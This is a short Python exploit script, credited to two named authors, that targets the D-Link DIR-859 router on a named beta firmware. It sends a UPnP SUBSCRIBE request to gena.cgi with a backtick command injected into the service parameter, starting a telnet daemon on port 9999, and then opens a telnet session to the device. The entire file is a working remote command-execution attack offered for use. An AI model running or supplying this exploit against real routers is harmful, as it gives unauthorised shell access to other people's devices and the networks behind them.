import socket
import os
from time import sleep
# Exploit By Miguel Mendez & Pablo Pollanco
# DLINK DIR-859
# Firmware DIR859Ax_FW106b01_beta01

def httpSUB(server, port, shell_file):
    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"

    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    results = con.recv(4096)

    sleep(1)
    print('[*] Running Telnetd Service')
    sleep(1)
    print('[*] Opening Telnet Connection\n')
    sleep(2)
    os.system('telnet ' + str(server) + ' 9999')

serverInput = raw_input('IP Router: ')
portInput = 49152

httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
